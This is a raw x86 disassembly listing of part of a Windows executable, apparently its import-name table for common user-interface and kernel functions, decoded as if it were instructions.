  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
